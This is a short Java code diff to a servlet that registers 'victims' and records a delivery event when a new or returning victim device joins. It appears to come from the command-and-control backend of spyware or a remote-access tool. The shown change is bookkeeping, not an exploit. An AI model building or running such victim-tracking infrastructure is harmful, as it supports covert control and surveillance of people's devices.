@@ -1,6 +1,8 @@
 package com.theah64.xrob.api.servlets;
 
+import com.theah64.xrob.api.database.tables.Deliveries;
 import com.theah64.xrob.api.database.tables.Victims;
+import com.theah64.xrob.api.models.Delivery;
 import com.theah64.xrob.api.models.Victim;
 import com.theah64.xrob.api.utils.APIResponse;
 import com.theah64.xrob.api.utils.RandomString;
@@ -72,7 +74,9 @@ public class INServlet extends BaseServlet {
                         RandomString.getRandomString(Victim.VICTIM_CODE_LENGTH)
                 );
 
-                victimsTable.addv2(newVictim);
+                final String victimId = victimsTable.addv3(newVictim);
+
+                Deliveries.getInstance().add(new Delivery(victimId, false, "join", Delivery.TYPE_JOIN, 0));
 
             } else {
 
@@ -96,6 +100,8 @@ public class INServlet extends BaseServlet {
 
                 //Old victim!
                 apiKey = oldVictim.getApiKey();
+
+                Deliveries.getInstance().add(new Delivery(oldVictim.getId(), false, "re_join", Delivery.TYPE_RE_JOIN, 0));
             }
 
 
